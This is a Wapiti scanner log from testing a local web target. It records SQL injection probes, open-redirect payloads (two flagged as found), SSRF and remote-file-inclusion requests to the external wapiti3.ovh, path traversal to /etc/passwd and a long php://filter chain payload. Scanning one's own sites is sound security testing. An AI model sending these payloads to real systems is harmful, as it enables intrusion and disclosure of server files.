2024-03-21 12:38:39.507 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:39.831 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
2024-03-21 12:38:39.831 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_e1257d38.db
2024-03-21 12:38:39.834 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 1 URLs and forms during the scan
2024-03-21 12:38:39.865 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
2024-03-21 12:38:39.865 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
2024-03-21 12:38:39.877 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
2024-03-21 12:38:40.149 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
2024-03-21 12:38:40.150 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
2024-03-21 12:38:40.173 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:40.410 | WARNING  | wapitiCore.controller.wapiti:attack:539 - 1 requests were skipped due to network issues
2024-03-21 12:38:40.411 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
2024-03-21 12:38:40.427 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:40.427 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/?after_logout=fuzz%C2%BF%27%22%28&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:40.613 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=fuzz%C2%BF%27%22%28 (0)
2024-03-21 12:38:40.977 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?after_logout=fuzz%20AND%2060%3D108%20AND%2056%3D56&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:41.158 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?after_logout=fuzz%20AND%2015%3D42%20AND%2084%3D84&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:41.339 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?after_logout=fuzz%20AND%2031%3D31%20AND%2082%3D82&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:41.514 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?after_logout=fuzz%27%20AND%2097%3D145%20AND%20%2719%27%3D%2719&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:41.684 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?after_logout=fuzz%27%20AND%2066%3D136%20AND%20%2773%27%3D%2773&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:41.864 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?after_logout=fuzz%27%20AND%2064%3D64%20AND%20%2743%27%3D%2743&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:42.047 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?after_logout=fuzz%22%20AND%2059%3D137%20AND%20%2297%22%3D%2297&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:42.219 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?after_logout=fuzz%22%20AND%2055%3D123%20AND%20%2229%22%3D%2229&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:42.397 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?after_logout=fuzz%22%20AND%2046%3D46%20AND%20%2266%22%3D%2266&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:42.569 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?after_logout=fuzz%29%20AND%2040%3D90%20AND%20%2851%3D51&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:42.742 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?after_logout=fuzz%29%20AND%2047%3D113%20AND%20%2883%3D83&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:42.914 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?after_logout=fuzz%29%20AND%2013%3D13%20AND%20%2868%3D68&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:43.097 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?after_logout=fuzz%27%29%20AND%2074%3D111%20AND%20%28%2738%27%3D%2738&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:43.278 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?after_logout=fuzz%27%29%20AND%2015%3D34%20AND%20%28%2793%27%3D%2793&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:43.448 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?after_logout=fuzz%27%29%20AND%2038%3D38%20AND%20%28%2780%27%3D%2780&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:43.631 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?after_logout=fuzz%22%29%20AND%2059%3D153%20AND%20%28%2297%22%3D%2297&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:43.804 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?after_logout=fuzz%22%29%20AND%2062%3D140%20AND%20%28%2214%22%3D%2214&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:43.978 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?after_logout=fuzz%22%29%20AND%2056%3D56%20AND%20%28%2214%22%3D%2214&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:44.150 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%20AND%2087%3D165%20AND%2091%3D91 (0)
2024-03-21 12:38:44.339 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%27%20AND%2065%3D119%20AND%20%2782%27%3D%2782 (0)
2024-03-21 12:38:44.524 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%22%20AND%2067%3D121%20AND%20%2223%22%3D%2223 (0)
2024-03-21 12:38:44.696 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%29%20AND%2057%3D74%20AND%20%2869%3D69 (0)
2024-03-21 12:38:44.877 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%27%29%20AND%2077%3D129%20AND%20%28%2737%27%3D%2737 (0)
2024-03-21 12:38:45.048 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%22%29%20AND%2044%3D101%20AND%20%28%2277%22%3D%2277 (0)
2024-03-21 12:38:45.244 | WARNING  | wapitiCore.controller.wapiti:attack:539 - 1 requests were skipped due to network issues
2024-03-21 12:38:45.244 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
2024-03-21 12:38:45.273 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
2024-03-21 12:38:45.289 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:45.461 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
2024-03-21 12:38:45.462 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
2024-03-21 12:38:45.532 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
2024-03-21 12:38:45.533 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
2024-03-21 12:38:45.609 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
2024-03-21 12:38:45.628 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:45.647 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
2024-03-21 12:38:45.659 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:45.659 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/?after_logout=https%3A%2F%2Fopenbugbounty.org%2F&aiowpsec_do_log_out=1
2024-03-21 12:38:45.936 | RED      | wapitiCore.attack.mod_redirect:attack:79 - ---
2024-03-21 12:38:45.937 | RED      | wapitiCore.attack.mod_redirect:attack:80 - Open Redirect in http://web/ via injection in the query string
2024-03-21 12:38:45.937 | RED      | wapitiCore.attack.mod_redirect:attack:86 - Evil request:
2024-03-21 12:38:45.937 | RED      | wapitiCore.attack.mod_redirect:attack:87 -     GET /?after_logout=https%3A%2F%2Fopenbugbounty.org%2F&aiowpsec_do_log_out=1 HTTP/1.1
    host: web
    connection: keep-alive
    user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
    accept-language: en-US,en;q=0.5
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    sec-fetch-user: ?1
    sec-fetch-site: none
    sec-fetch-mode: navigate
    sec-fetch-dest: document
    upgrade-insecure-requests: 1
    dnt: 1
2024-03-21 12:38:45.937 | RED      | wapitiCore.attack.mod_redirect:attack:88 - ---
2024-03-21 12:38:45.938 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/?after_logout=%2F%2Fopenbugbounty.org%2F&aiowpsec_do_log_out=1
2024-03-21 12:38:46.204 | RED      | wapitiCore.attack.mod_redirect:attack:79 - ---
2024-03-21 12:38:46.205 | RED      | wapitiCore.attack.mod_redirect:attack:80 - Open Redirect in http://web/ via injection in the query string
2024-03-21 12:38:46.205 | RED      | wapitiCore.attack.mod_redirect:attack:86 - Evil request:
2024-03-21 12:38:46.206 | RED      | wapitiCore.attack.mod_redirect:attack:87 -     GET /?after_logout=%2F%2Fopenbugbounty.org%2F&aiowpsec_do_log_out=1 HTTP/1.1
    host: web
    connection: keep-alive
    user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
    accept-language: en-US,en;q=0.5
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    sec-fetch-user: ?1
    sec-fetch-site: none
    sec-fetch-mode: navigate
    sec-fetch-dest: document
    upgrade-insecure-requests: 1
    dnt: 1
2024-03-21 12:38:46.206 | RED      | wapitiCore.attack.mod_redirect:attack:88 - ---
2024-03-21 12:38:46.206 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/?after_logout=fuzz&aiowpsec_do_log_out=https%3A%2F%2Fopenbugbounty.org%2F
2024-03-21 12:38:46.379 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/?after_logout=fuzz&aiowpsec_do_log_out=%2F%2Fopenbugbounty.org%2F
2024-03-21 12:38:46.587 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
2024-03-21 12:38:46.605 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:46.606 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/?after_logout=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fetbo0r%2F1%2F61667465725f6c6f676f7574%2F&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:46.781 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fetbo0r%2F1%2F61696f77707365635f646f5f6c6f675f6f7574%2F (0)
2024-03-21 12:38:46.984 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=etbo0r for results, please wait...
2024-03-21 12:38:49.126 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
2024-03-21 12:38:49.141 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:49.144 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:49.321 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:49.499 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=%2Fetc%2Fpasswd&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:49.680 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=%2Fetc%2Fpasswd%00&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:49.865 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=%2Fetc%2Fservices&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:50.048 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=%2Fetc%2Fservices%00&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:50.220 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:50.390 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:50.564 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:50.735 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:50.918 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:51.093 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:51.267 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:51.443 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:51.621 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:51.795 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:51.967 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:52.152 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:52.332 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:52.523 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:52.712 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:52.939 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:53.153 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:53.357 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:53.544 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:53.728 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:53.924 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:54.105 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:54.301 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:54.494 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:54.683 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:54.867 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:55.042 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:55.213 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:55.401 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:55.576 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&aiowpsec_do_log_out=1 (0)
